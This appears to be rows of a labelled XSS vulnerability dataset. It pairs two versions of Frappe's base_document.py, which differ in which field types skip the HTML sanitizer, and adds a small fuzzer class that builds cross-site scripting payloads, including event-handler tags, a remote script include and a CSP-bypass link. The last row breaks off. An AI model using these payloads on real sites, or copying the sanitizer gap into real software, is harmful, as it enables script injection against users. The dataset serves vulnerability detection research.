		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"", ""Barcode"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",0,xss
5,73,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"/frappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",1,xss
6,20,bc18f1148918f6cef38f2d7f575482dc43575b7b,"saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return ""<script>alert(/xss/)</script>""

    def img(self):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",0,xss
7,21,bc18f1148918f6cef38f2d7f575482dc43575b7b,"/saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

